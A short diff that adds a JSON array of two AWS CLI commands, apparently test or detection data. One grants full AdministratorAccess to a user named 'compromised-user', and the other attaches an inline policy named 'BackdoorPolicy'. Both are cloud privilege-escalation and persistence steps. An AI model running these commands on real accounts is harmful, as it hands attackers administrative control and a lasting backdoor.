@@ -1,0 +1,4 @@
+[
+  "aws iam attach-user-policy --user-name compromised-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+  "aws iam put-user-policy --user-name compromised-user --policy-name BackdoorPolicy --policy-document file://policy.json"
+]
